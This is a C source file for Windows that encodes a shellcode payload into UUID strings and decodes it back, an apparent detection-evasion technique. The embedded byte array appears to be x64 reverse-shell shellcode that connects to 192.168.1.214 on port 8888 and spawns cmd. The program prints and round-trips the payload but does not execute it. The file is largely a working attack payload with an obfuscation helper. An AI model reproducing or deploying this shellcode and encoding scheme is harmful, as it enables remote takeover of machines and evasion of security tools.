#include <Windows.h>
#include <rpcdce.h>
#include "misc.h"


BOOL payloadToUUIDs(IN PBYTE pbPayload, IN SIZE_T ulPayload, OUT LPWSTR pszUUIDs, IN SIZE_T& ulUUIDs)
{
    RPC_STATUS rs = NULL;
    RPC_WSTR szUuid = NULL;

    SIZE_T ulRound = 0;
    UUID uuid = { 0 };

    errno_t err = 0;

    if (ulPayload % 16 != 0)
    {
        wprintf(L"[!] Input buffer size needs to be (%% 16 == 0), add %Id bytes of padding.\n", (16 - (ulPayload % 16)));
        return FALSE;
    }

    for (; ulRound < ulPayload / 16; ulRound++)
    {
        uuid = { 0 };

        uuid.Data1 = *((unsigned long*)&pbPayload[ulRound * 16 + 0]);
        uuid.Data2 = *((unsigned short*)&pbPayload[ulRound * 16 + 4]);
        uuid.Data3 = *((unsigned short*)&pbPayload[ulRound * 16 + 6]);

        uuid.Data4[0] = *((unsigned char*)&pbPayload[ulRound * 16 + 8]);
        uuid.Data4[1] = *((unsigned char*)&pbPayload[ulRound * 16 + 9]);
        uuid.Data4[2] = *((unsigned char*)&pbPayload[ulRound * 16 + 10]);
        uuid.Data4[3] = *((unsigned char*)&pbPayload[ulRound * 16 + 11]);
        uuid.Data4[4] = *((unsigned char*)&pbPayload[ulRound * 16 + 12]);
        uuid.Data4[5] = *((unsigned char*)&pbPayload[ulRound * 16 + 13]);
        uuid.Data4[6] = *((unsigned char*)&pbPayload[ulRound * 16 + 14]);
        uuid.Data4[7] = *((unsigned char*)&pbPayload[ulRound * 16 + 15]);

        rs = UuidToStringW(&uuid, &szUuid);
        if (rs != RPC_S_OK)
        {
            printRpcStatus(L"UuidToStringW", rs);
            return FALSE;
        }

        //wprintf(L"%s\n", (LPWSTR)szUuid);

        err = wcscat_s(pszUUIDs, ulUUIDs, (LPWSTR)szUuid);
        if (err != 0)
        {
            printError(L"wcscat_s");
            return FALSE;

        }

        ulUUIDs = ulUUIDs - 16;

        err = wcscat_s(pszUUIDs, ulUUIDs, L",");
        if (err != 0)
        {
            printError(L"wcscat_s");
            return FALSE;

        }

        ulUUIDs = ulUUIDs - 1;
    }

    return TRUE;
}

BOOL UUIDsToPayload(IN LPWSTR pszUUIDs, OUT PBYTE pbPayload, OUT SIZE_T &ulPayload)
{
    DWORD dwPayloadIdx = 0;

    LPWSTR psTokenUUID = NULL;
    LPWSTR psContexUUID= NULL;

    UUID uuid = { 0 };

    RPC_STATUS rs = NULL;

    psTokenUUID = wcstok_s(pszUUIDs, L",", &psContexUUID);
    while (psTokenUUID != NULL)
    {
        rs = UuidFromStringW((RPC_WSTR)psTokenUUID, &uuid);
        if (rs != RPC_S_OK)
        {
            printRpcStatus(L"UuidToStringW", rs);
            return FALSE;
        }
    
        memcpy_s(pbPayload, ulPayload - dwPayloadIdx * 16, &uuid, 16);
        pbPayload = pbPayload + 16;

        psTokenUUID = wcstok_s(NULL, L",", &psContexUUID);

        ++dwPayloadIdx;
    }

    return TRUE;
}

int main()
{
    BYTE pbPayload[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
        "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
        "\x00\x49\x89\xe5\x49\xbc\x02\x00\x22\xb8\xc0\xa8\x01\xd6"
        "\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
        "\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
        "\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
        "\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
        "\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
        "\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
        "\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
        "\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
        "\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
        "\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
        "\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
        "\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
        "\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
        "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
        "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
        "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
        "\xF0\x0F\xF0\x0F";

    SIZE_T ulPayload = sizeof(pbPayload) / sizeof(BYTE) - 1;

    WCHAR psOut[1024 * 4] = { 0 };
    SIZE_T ulOut = sizeof(psOut) / sizeof(WCHAR) - 1;

    printHex(pbPayload, ulPayload);


    payloadToUUIDs(pbPayload, ulPayload, psOut, ulOut);

    wprintf(L"%s\n\n", psOut);
    //wprintf(L"ulOut: %d", ulOut);


    PBYTE pbPayloadNew = (PBYTE)malloc(ulPayload);

    UUIDsToPayload(psOut, pbPayloadNew, ulPayload);

    printHex(pbPayloadNew, ulPayload);


    free(pbPayloadNew);
	return 0;
}